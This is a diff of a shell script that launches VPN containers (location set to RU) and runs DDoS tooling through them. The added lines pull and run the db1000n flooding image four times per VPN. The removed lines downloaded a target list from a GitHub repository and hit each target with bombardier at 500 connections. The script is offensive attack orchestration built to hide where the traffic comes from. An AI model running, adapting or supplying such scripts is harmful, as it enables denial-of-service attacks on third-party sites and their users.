@@ -45,24 +45,20 @@ do
   docker run --name $fn -e PUID=1000 -e PGID=1000 -e WINDSCRIBE_USERNAME=$windscribeUserName -e WINDSCRIBE_PASSWORD=$windscribePassword -e WINDSCRIBE_LOCATION=RU -e VPN_PORT=8080 --dns 8.8.8.8 --cap-add NET_ADMIN --restart unless-stopped -d wiorca/docker-windscribe
 done
 
+for vpn in "vpn1" "vpn2"
+do
+  for v in 1 2 3 4
+  do
+    docker run --net=container:$vpn --restart=always --detach --pull=always ghcr.io/arriven/db1000n:latest
+    sleep 3
+  done
+done
+
 while :
 do
-    wget -O list.txt https://raw.githubusercontent.com/eko24ive/miniature-palm-tree/main/$fileName.txt
-    myarray=(`cat list.txt`)
-    noofelements=${#myarray[*]}
-    counter=0
-    while [ $counter -lt $noofelements ]
-    do
-      for v in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15
-      do
-        randVpn=${vpns[RANDOM%2]}
-        if [ "$(docker ps -f name=$randVpn | grep "\<unhealthy\>")" ]; then
-              docker restart $randVpn
-              sleep 10
-        fi
-        docker run --net=container:$randVpn -ti --rm -d alpine/bombardier -c 500 -d $TIME -l ${myarray[$counter]}
-        sleep 3
-      done
-    counter=$(( $counter + 1 ))
-    done
+  if [ "$(docker ps -f name=$vpn | grep "\<unhealthy\>")" ]; then
+        docker restart $vpn
+        sleep 10
+  fi
+  sleep 60
 done
